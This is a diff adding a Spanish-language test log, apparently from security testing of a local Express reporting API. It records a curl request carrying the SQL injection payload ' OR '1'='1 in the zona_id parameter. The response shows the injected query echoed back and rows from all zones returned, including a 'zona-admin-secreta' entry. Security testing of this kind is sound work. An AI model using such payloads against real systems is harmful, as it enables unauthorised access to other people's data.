@@ -1,0 +1,16 @@
+### Prueba: A03_sql_injection
+### Fecha : 2026-10-04 20:37:30
+### Objetivo: http://localhost:3000
+### Comando: curl -G http://localhost:3000/api/reportes/historico --data-urlencode zona_id=zona-1' OR '1'='1
+---------------------------------------------
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 352
+ETag: W/"160-SJbHFxdCRCy79ITjKbWPDCxaHBA"
+Date: Sun, 04 Oct 2026 20:37:30 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"sql_ejecutado":"SELECT * FROM lecturas WHERE zona_id = 'zona-1' OR '1'='1'","resultados":[{"id":1,"zona_id":"zona-1","temperatura":22.5,"humedad":38.2,"fecha":"2026-09-01"},{"id":2,"zona_id":"zona-2","temperatura":24.1,"humedad":41.7,"fecha":"2026-09-02"},{"id":3,"zona_id":"zona-admin-secreta","temperatura":19.9,"humedad":55,"fecha":"2026-09-03"}]}
+---------------------------------------------
